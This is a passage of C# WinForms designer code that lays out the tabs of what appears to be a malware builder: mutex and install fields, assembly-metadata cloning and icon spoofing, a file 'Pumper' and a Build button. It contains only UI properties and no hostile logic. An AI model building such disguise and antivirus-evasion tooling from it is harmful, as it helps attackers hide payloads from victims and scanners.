        this.label6.Name = "label6";
        this.label6.Size = new System.Drawing.Size(45, 19);
        this.label6.TabIndex = 122;
        this.label6.Text = "Install";
        this.txtGroup.Animated = true;
        this.txtGroup.BackColor = System.Drawing.Color.Transparent;
        this.txtGroup.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtGroup.BorderRadius = 5;
        this.txtGroup.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtGroup.DefaultText = "Default";
        this.txtGroup.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtGroup.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtGroup.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtGroup.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtGroup.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtGroup.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtGroup.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtGroup.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtGroup.Location = new System.Drawing.Point(69, 47);
        this.txtGroup.Name = "txtGroup";
        this.txtGroup.PasswordChar = '\0';
        this.txtGroup.PlaceholderText = "";
        this.txtGroup.SelectedText = "";
        this.txtGroup.SelectionStart = 7;
        this.txtGroup.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtGroup.ShadowDecoration.Depth = 10;
        this.txtGroup.ShadowDecoration.Enabled = true;
        this.txtGroup.Size = new System.Drawing.Size(114, 23);
        this.txtGroup.TabIndex = 121;
        this.button1.Animated = true;
        this.button1.BackColor = System.Drawing.Color.Transparent;
        this.button1.BorderColor = System.Drawing.Color.DimGray;
        this.button1.BorderRadius = 9;
        this.button1.CustomBorderColor = System.Drawing.Color.DimGray;
        this.button1.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.button1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.button1.ForeColor = System.Drawing.Color.White;
        this.button1.Location = new System.Drawing.Point(263, 6);
        this.button1.Name = "button1";
        this.button1.PressedColor = System.Drawing.Color.Snow;
        this.button1.ShadowDecoration.BorderRadius = 10;
        this.button1.ShadowDecoration.Color = System.Drawing.Color.Gray;
        this.button1.ShadowDecoration.Depth = 10;
        this.button1.ShadowDecoration.Enabled = true;
        this.button1.Size = new System.Drawing.Size(111, 28);
        this.button1.TabIndex = 120;
        this.button1.Text = "Generate";
        this.button1.Click += new System.EventHandler(button1_Click);
        this.txtMutex.Animated = true;
        this.txtMutex.BackColor = System.Drawing.Color.Transparent;
        this.txtMutex.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtMutex.BorderRadius = 5;
        this.txtMutex.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtMutex.DefaultText = "";
        this.txtMutex.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtMutex.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtMutex.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtMutex.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtMutex.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtMutex.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtMutex.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtMutex.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtMutex.Location = new System.Drawing.Point(69, 9);
        this.txtMutex.Name = "txtMutex";
        this.txtMutex.PasswordChar = '\0';
        this.txtMutex.PlaceholderText = "";
        this.txtMutex.SelectedText = "";
        this.txtMutex.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtMutex.ShadowDecoration.Depth = 10;
        this.txtMutex.ShadowDecoration.Enabled = true;
        this.txtMutex.Size = new System.Drawing.Size(188, 23);
        this.txtMutex.TabIndex = 119;
        this.tabPage2.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.tabPage2.Controls.Add(this.label24);
        this.tabPage2.Controls.Add(this.chkIcon);
        this.tabPage2.Controls.Add(this.label23);
        this.tabPage2.Controls.Add(this.btnAssembly);
        this.tabPage2.Controls.Add(this.btnIcon);
        this.tabPage2.Controls.Add(this.btnClone);
        this.tabPage2.Controls.Add(this.txtDescription);
        this.tabPage2.Controls.Add(this.txtCompany);
        this.tabPage2.Controls.Add(this.txtCopyright);
        this.tabPage2.Controls.Add(this.txtFileVersion);
        this.tabPage2.Controls.Add(this.txtProductVersion);
        this.tabPage2.Controls.Add(this.txtOriginalFilename);
        this.tabPage2.Controls.Add(this.txtTrademarks);
        this.tabPage2.Controls.Add(this.txtProduct);
        this.tabPage2.Controls.Add(this.pictureBox1);
        this.tabPage2.Controls.Add(this.label7);
        this.tabPage2.Controls.Add(this.picIcon);
        this.tabPage2.Controls.Add(this.label14);
        this.tabPage2.Controls.Add(this.txtIcon);
        this.tabPage2.Controls.Add(this.label8);
        this.tabPage2.Controls.Add(this.label13);
        this.tabPage2.Controls.Add(this.label12);
        this.tabPage2.Controls.Add(this.label11);
        this.tabPage2.Controls.Add(this.label9);
        this.tabPage2.Controls.Add(this.label10);
        this.tabPage2.Location = new System.Drawing.Point(0, 40);
        this.tabPage2.Name = "tabPage2";
        this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
        this.tabPage2.Size = new System.Drawing.Size(701, 362);
        this.tabPage2.TabIndex = 1;
        this.tabPage2.Text = "Assembly";
        this.tabPage2.Click += new System.EventHandler(tabPage2_Click);
        this.label24.AutoSize = true;
        this.label24.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label24.ForeColor = System.Drawing.Color.Honeydew;
        this.label24.Location = new System.Drawing.Point(547, 6);
        this.label24.Name = "label24";
        this.label24.Size = new System.Drawing.Size(35, 19);
        this.label24.TabIndex = 133;
        this.label24.Text = "Icon";
        this.chkIcon.Location = new System.Drawing.Point(507, 5);
        this.chkIcon.Name = "chkIcon";
        this.chkIcon.Size = new System.Drawing.Size(38, 22);
        this.chkIcon.TabIndex = 132;
        this.chkIcon.Text = "siticoneOSToggleSwith2";
        this.chkIcon.CheckedChanged += new System.EventHandler(ChkIcon_CheckedChanged);
        this.label23.AutoSize = true;
        this.label23.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label23.ForeColor = System.Drawing.Color.Honeydew;
        this.label23.Location = new System.Drawing.Point(100, 25);
        this.label23.Name = "label23";
        this.label23.Size = new System.Drawing.Size(67, 19);
        this.label23.TabIndex = 131;
        this.label23.Text = "Assembly";
        this.btnAssembly.Location = new System.Drawing.Point(60, 24);
        this.btnAssembly.Name = "btnAssembly";
        this.btnAssembly.Size = new System.Drawing.Size(38, 22);
        this.btnAssembly.TabIndex = 130;
        this.btnAssembly.Text = "siticoneOSToggleSwith2";
        this.btnAssembly.CheckedChanged += new System.EventHandler(BtnAssembly_CheckedChanged);
        this.btnIcon.BorderRadius = 8;
        this.btnIcon.Enabled = false;
        this.btnIcon.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.btnIcon.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.btnIcon.ForeColor = System.Drawing.Color.White;
        this.btnIcon.Location = new System.Drawing.Point(615, 99);
        this.btnIcon.Name = "btnIcon";
        this.btnIcon.Size = new System.Drawing.Size(80, 30);
        this.btnIcon.TabIndex = 129;
        this.btnIcon.Text = "Add";
        this.btnIcon.Click += new System.EventHandler(BtnIcon_Click);
        this.btnClone.BorderRadius = 8;
        this.btnClone.Enabled = false;
        this.btnClone.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.btnClone.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.btnClone.ForeColor = System.Drawing.Color.White;
        this.btnClone.Location = new System.Drawing.Point(156, 313);
        this.btnClone.Name = "btnClone";
        this.btnClone.Size = new System.Drawing.Size(140, 30);
        this.btnClone.TabIndex = 128;
        this.btnClone.Text = "Clone Assembly";
        this.btnClone.Click += new System.EventHandler(BtnClone_Click);
        this.txtDescription.Animated = true;
        this.txtDescription.BackColor = System.Drawing.Color.Transparent;
        this.txtDescription.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtDescription.BorderRadius = 5;
        this.txtDescription.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtDescription.DefaultText = "";
        this.txtDescription.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtDescription.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtDescription.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtDescription.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtDescription.Enabled = false;
        this.txtDescription.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtDescription.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtDescription.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtDescription.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtDescription.Location = new System.Drawing.Point(108, 99);
        this.txtDescription.Name = "txtDescription";
        this.txtDescription.PasswordChar = '\0';
        this.txtDescription.PlaceholderText = "";
        this.txtDescription.SelectedText = "";
        this.txtDescription.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtDescription.ShadowDecoration.Depth = 10;
        this.txtDescription.ShadowDecoration.Enabled = true;
        this.txtDescription.Size = new System.Drawing.Size(188, 23);
        this.txtDescription.TabIndex = 127;
        this.txtCompany.Animated = true;
        this.txtCompany.BackColor = System.Drawing.Color.Transparent;
        this.txtCompany.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtCompany.BorderRadius = 5;
        this.txtCompany.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtCompany.DefaultText = "";
        this.txtCompany.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtCompany.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtCompany.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtCompany.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtCompany.Enabled = false;
        this.txtCompany.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtCompany.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtCompany.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtCompany.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtCompany.Location = new System.Drawing.Point(108, 129);
        this.txtCompany.Name = "txtCompany";
        this.txtCompany.PasswordChar = '\0';
        this.txtCompany.PlaceholderText = "";
        this.txtCompany.SelectedText = "";
        this.txtCompany.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtCompany.ShadowDecoration.Depth = 10;
        this.txtCompany.ShadowDecoration.Enabled = true;
        this.txtCompany.Size = new System.Drawing.Size(188, 23);
        this.txtCompany.TabIndex = 126;
        this.txtCopyright.Animated = true;
        this.txtCopyright.BackColor = System.Drawing.Color.Transparent;
        this.txtCopyright.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtCopyright.BorderRadius = 5;
        this.txtCopyright.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtCopyright.DefaultText = "";
        this.txtCopyright.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtCopyright.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtCopyright.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtCopyright.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtCopyright.Enabled = false;
        this.txtCopyright.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtCopyright.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtCopyright.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtCopyright.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtCopyright.Location = new System.Drawing.Point(108, 158);
        this.txtCopyright.Name = "txtCopyright";
        this.txtCopyright.PasswordChar = '\0';
        this.txtCopyright.PlaceholderText = "";
        this.txtCopyright.SelectedText = "";
        this.txtCopyright.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtCopyright.ShadowDecoration.Depth = 10;
        this.txtCopyright.ShadowDecoration.Enabled = true;
        this.txtCopyright.Size = new System.Drawing.Size(188, 23);
        this.txtCopyright.TabIndex = 125;
        this.txtFileVersion.Animated = true;
        this.txtFileVersion.BackColor = System.Drawing.Color.Transparent;
        this.txtFileVersion.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtFileVersion.BorderRadius = 5;
        this.txtFileVersion.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtFileVersion.DefaultText = "0.0.0.0";
        this.txtFileVersion.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtFileVersion.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtFileVersion.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtFileVersion.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtFileVersion.Enabled = false;
        this.txtFileVersion.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtFileVersion.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtFileVersion.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtFileVersion.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtFileVersion.Location = new System.Drawing.Point(108, 274);
        this.txtFileVersion.Name = "txtFileVersion";
        this.txtFileVersion.PasswordChar = '\0';
        this.txtFileVersion.PlaceholderText = "";
        this.txtFileVersion.SelectedText = "";
        this.txtFileVersion.SelectionStart = 7;
        this.txtFileVersion.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtFileVersion.ShadowDecoration.Depth = 10;
        this.txtFileVersion.ShadowDecoration.Enabled = true;
        this.txtFileVersion.Size = new System.Drawing.Size(188, 23);
        this.txtFileVersion.TabIndex = 124;
        this.txtProductVersion.Animated = true;
        this.txtProductVersion.BackColor = System.Drawing.Color.Transparent;
        this.txtProductVersion.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtProductVersion.BorderRadius = 5;
        this.txtProductVersion.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtProductVersion.DefaultText = "0.0.0.0";
        this.txtProductVersion.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtProductVersion.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtProductVersion.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtProductVersion.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtProductVersion.Enabled = false;
        this.txtProductVersion.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtProductVersion.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtProductVersion.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtProductVersion.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtProductVersion.Location = new System.Drawing.Point(108, 245);
        this.txtProductVersion.Name = "txtProductVersion";
        this.txtProductVersion.PasswordChar = '\0';
        this.txtProductVersion.PlaceholderText = "";
        this.txtProductVersion.SelectedText = "";
        this.txtProductVersion.SelectionStart = 7;
        this.txtProductVersion.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtProductVersion.ShadowDecoration.Depth = 10;
        this.txtProductVersion.ShadowDecoration.Enabled = true;
        this.txtProductVersion.Size = new System.Drawing.Size(188, 23);
        this.txtProductVersion.TabIndex = 123;
        this.txtOriginalFilename.Animated = true;
        this.txtOriginalFilename.BackColor = System.Drawing.Color.Transparent;
        this.txtOriginalFilename.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtOriginalFilename.BorderRadius = 5;
        this.txtOriginalFilename.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtOriginalFilename.DefaultText = "";
        this.txtOriginalFilename.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtOriginalFilename.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtOriginalFilename.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtOriginalFilename.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtOriginalFilename.Enabled = false;
        this.txtOriginalFilename.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtOriginalFilename.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtOriginalFilename.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtOriginalFilename.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtOriginalFilename.Location = new System.Drawing.Point(108, 216);
        this.txtOriginalFilename.Name = "txtOriginalFilename";
        this.txtOriginalFilename.PasswordChar = '\0';
        this.txtOriginalFilename.PlaceholderText = "";
        this.txtOriginalFilename.SelectedText = "";
        this.txtOriginalFilename.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtOriginalFilename.ShadowDecoration.Depth = 10;
        this.txtOriginalFilename.ShadowDecoration.Enabled = true;
        this.txtOriginalFilename.Size = new System.Drawing.Size(188, 23);
        this.txtOriginalFilename.TabIndex = 122;
        this.txtTrademarks.Animated = true;
        this.txtTrademarks.BackColor = System.Drawing.Color.Transparent;
        this.txtTrademarks.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtTrademarks.BorderRadius = 5;
        this.txtTrademarks.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtTrademarks.DefaultText = "";
        this.txtTrademarks.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtTrademarks.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtTrademarks.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtTrademarks.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtTrademarks.Enabled = false;
        this.txtTrademarks.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtTrademarks.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtTrademarks.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtTrademarks.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtTrademarks.Location = new System.Drawing.Point(108, 187);
        this.txtTrademarks.Name = "txtTrademarks";
        this.txtTrademarks.PasswordChar = '\0';
        this.txtTrademarks.PlaceholderText = "";
        this.txtTrademarks.SelectedText = "";
        this.txtTrademarks.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtTrademarks.ShadowDecoration.Depth = 10;
        this.txtTrademarks.ShadowDecoration.Enabled = true;
        this.txtTrademarks.Size = new System.Drawing.Size(188, 23);
        this.txtTrademarks.TabIndex = 121;
        this.txtProduct.Animated = true;
        this.txtProduct.BackColor = System.Drawing.Color.Transparent;
        this.txtProduct.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtProduct.BorderRadius = 5;
        this.txtProduct.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.txtProduct.DefaultText = "";
        this.txtProduct.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.txtProduct.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.txtProduct.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtProduct.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.txtProduct.Enabled = false;
        this.txtProduct.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.txtProduct.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtProduct.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.txtProduct.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.txtProduct.Location = new System.Drawing.Point(108, 70);
        this.txtProduct.Name = "txtProduct";
        this.txtProduct.PasswordChar = '\0';
        this.txtProduct.PlaceholderText = "";
        this.txtProduct.SelectedText = "";
        this.txtProduct.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.txtProduct.ShadowDecoration.Depth = 10;
        this.txtProduct.ShadowDecoration.Enabled = true;
        this.txtProduct.Size = new System.Drawing.Size(188, 23);
        this.txtProduct.TabIndex = 120;
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(6, 9);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(48, 47);
        this.pictureBox1.TabIndex = 97;
        this.pictureBox1.TabStop = false;
        this.tabPage4.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.tabPage4.Controls.Add(this.guna2RadioButton3);
        this.tabPage4.Controls.Add(this.guna2RadioButton2);
        this.tabPage4.Controls.Add(this.guna2RadioButton1);
        this.tabPage4.Controls.Add(this.label30);
        this.tabPage4.Controls.Add(this.guna2Button3);
        this.tabPage4.Controls.Add(this.label26);
        this.tabPage4.Controls.Add(this.guna2TextBox2);
        this.tabPage4.Controls.Add(this.guna2Button2);
        this.tabPage4.Controls.Add(this.guna2TextBox1);
        this.tabPage4.Location = new System.Drawing.Point(0, 40);
        this.tabPage4.Name = "tabPage4";
        this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
        this.tabPage4.Size = new System.Drawing.Size(701, 362);
        this.tabPage4.TabIndex = 4;
        this.tabPage4.Text = "Pumper";
        this.label30.AutoSize = true;
        this.label30.Font = new System.Drawing.Font("Roboto", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label30.ForeColor = System.Drawing.Color.White;
        this.label30.Location = new System.Drawing.Point(11, 27);
        this.label30.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label30.Name = "label30";
        this.label30.Size = new System.Drawing.Size(74, 19);
        this.label30.TabIndex = 139;
        this.label30.Text = "File path:";
        this.guna2Button3.Animated = true;
        this.guna2Button3.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button3.BorderColor = System.Drawing.Color.DimGray;
        this.guna2Button3.BorderRadius = 9;
        this.guna2Button3.CustomBorderColor = System.Drawing.Color.DimGray;
        this.guna2Button3.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2Button3.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.guna2Button3.ForeColor = System.Drawing.Color.White;
        this.guna2Button3.Location = new System.Drawing.Point(15, 153);
        this.guna2Button3.Name = "guna2Button3";
        this.guna2Button3.PressedColor = System.Drawing.Color.Snow;
        this.guna2Button3.ShadowDecoration.BorderRadius = 10;
        this.guna2Button3.ShadowDecoration.Color = System.Drawing.Color.Gray;
        this.guna2Button3.ShadowDecoration.Depth = 10;
        this.guna2Button3.ShadowDecoration.Enabled = true;
        this.guna2Button3.Size = new System.Drawing.Size(157, 30);
        this.guna2Button3.TabIndex = 138;
        this.guna2Button3.Text = "Pump File";
        this.guna2Button3.Click += new System.EventHandler(guna2Button3_Click);
        this.label26.AutoSize = true;
        this.label26.Font = new System.Drawing.Font("Roboto", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label26.ForeColor = System.Drawing.Color.White;
        this.label26.Location = new System.Drawing.Point(11, 80);
        this.label26.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label26.Name = "label26";
        this.label26.Size = new System.Drawing.Size(43, 19);
        this.label26.TabIndex = 124;
        this.label26.Text = "Size:";
        this.guna2TextBox2.Animated = true;
        this.guna2TextBox2.BackColor = System.Drawing.Color.Transparent;
        this.guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2TextBox2.BorderRadius = 5;
        this.guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.guna2TextBox2.DefaultText = "";
        this.guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.guna2TextBox2.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.guna2TextBox2.Location = new System.Drawing.Point(12, 101);
        this.guna2TextBox2.Name = "guna2TextBox2";
        this.guna2TextBox2.PasswordChar = '\0';
        this.guna2TextBox2.PlaceholderText = "";
        this.guna2TextBox2.SelectedText = "";
        this.guna2TextBox2.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2TextBox2.ShadowDecoration.Depth = 10;
        this.guna2TextBox2.ShadowDecoration.Enabled = true;
        this.guna2TextBox2.Size = new System.Drawing.Size(160, 23);
        this.guna2TextBox2.TabIndex = 123;
        this.guna2Button2.Animated = true;
        this.guna2Button2.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button2.BorderColor = System.Drawing.Color.DimGray;
        this.guna2Button2.BorderRadius = 9;
        this.guna2Button2.CustomBorderColor = System.Drawing.Color.DimGray;
        this.guna2Button2.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2Button2.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.guna2Button2.ForeColor = System.Drawing.Color.White;
        this.guna2Button2.Location = new System.Drawing.Point(587, 46);
        this.guna2Button2.Name = "guna2Button2";
        this.guna2Button2.PressedColor = System.Drawing.Color.Snow;
        this.guna2Button2.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.guna2Button2.ShadowDecoration.BorderRadius = 10;
        this.guna2Button2.ShadowDecoration.Color = System.Drawing.Color.Gray;
        this.guna2Button2.ShadowDecoration.Depth = 10;
        this.guna2Button2.ShadowDecoration.Enabled = true;
        this.guna2Button2.ShadowDecoration.Shadow = new System.Windows.Forms.Padding(3);
        this.guna2Button2.Size = new System.Drawing.Size(111, 28);
        this.guna2Button2.TabIndex = 122;
        this.guna2Button2.Text = "Browse";
        this.guna2Button2.Click += new System.EventHandler(guna2Button2_Click);
        this.guna2TextBox1.Animated = true;
        this.guna2TextBox1.BackColor = System.Drawing.Color.Transparent;
        this.guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2TextBox1.BorderRadius = 5;
        this.guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.guna2TextBox1.DefaultText = "";
        this.guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.guna2TextBox1.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
        this.guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.guna2TextBox1.Location = new System.Drawing.Point(12, 49);
        this.guna2TextBox1.Name = "guna2TextBox1";
        this.guna2TextBox1.PasswordChar = '\0';
        this.guna2TextBox1.PlaceholderText = "";
        this.guna2TextBox1.SelectedText = "";
        this.guna2TextBox1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2TextBox1.ShadowDecoration.Depth = 10;
        this.guna2TextBox1.ShadowDecoration.Enabled = true;
        this.guna2TextBox1.Size = new System.Drawing.Size(572, 23);
        this.guna2TextBox1.TabIndex = 121;
        this.tabPage3.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.tabPage3.Controls.Add(this.btnBuild);
        this.tabPage3.Controls.Add(this.guna2PictureBox1);
        this.tabPage3.Location = new System.Drawing.Point(0, 40);
        this.tabPage3.Name = "tabPage3";
        this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
        this.tabPage3.Size = new System.Drawing.Size(701, 362);
        this.tabPage3.TabIndex = 3;
